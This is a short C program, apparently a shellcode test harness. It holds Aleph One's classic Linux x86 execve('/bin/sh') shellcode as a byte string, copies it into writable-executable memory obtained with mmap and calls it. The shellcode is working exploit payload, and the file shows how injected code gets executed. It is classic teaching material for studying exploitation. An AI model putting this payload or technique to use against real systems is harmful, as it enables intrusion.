#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc) ();

char shellcode[] =		/* just aleph1's old shellcode (linux x86) */
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0"
    "\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
    "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char **argv)
{

	void *ptr = mmap(0, sizeof(shellcode),
			 PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
			 | MAP_PRIVATE, -1, 0);

	if (ptr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memcpy(ptr, shellcode, sizeof(shellcode));
	sc = ptr;

	sc();

	return 0;
}
